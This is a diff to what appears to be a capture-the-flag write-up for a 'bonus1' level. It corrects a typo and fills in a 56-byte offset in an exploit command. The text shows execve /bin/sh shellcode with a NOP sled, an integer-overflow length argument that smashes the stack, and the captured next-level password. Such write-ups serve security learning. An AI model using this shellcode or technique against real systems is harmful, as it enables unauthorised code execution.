@@ -26,7 +26,7 @@ int main(int param_1, undefined4 param_2)
 unsigned int max = 4294967296\
 4294967296 / 4  = 1073741824 => memcpy 0;
 
-let's use our global shellcoe again\
+let's use our global shellcode again\
 `export SHELLCODE=$(python -c "print '\x90'*200 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80'")`
 
 `/tmp/get_env SHELLCODE`\
@@ -43,7 +43,7 @@ It's dichotomy time !
 
 So the len is `-(1073741823 - 56/4)` = `-(1073741823 - 14)` = `-1073741809`
 
-./bonus1 -1073741809 $(python -c "print 'a' * OFFSET + '\x2e\xf8\xff\xbf'")
+./bonus1 -1073741809 $(python -c "print 'a' * 56 + '\x2e\xf8\xff\xbf'")
 ```
 $ cat /home/user/bonus2/.pass
 579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245
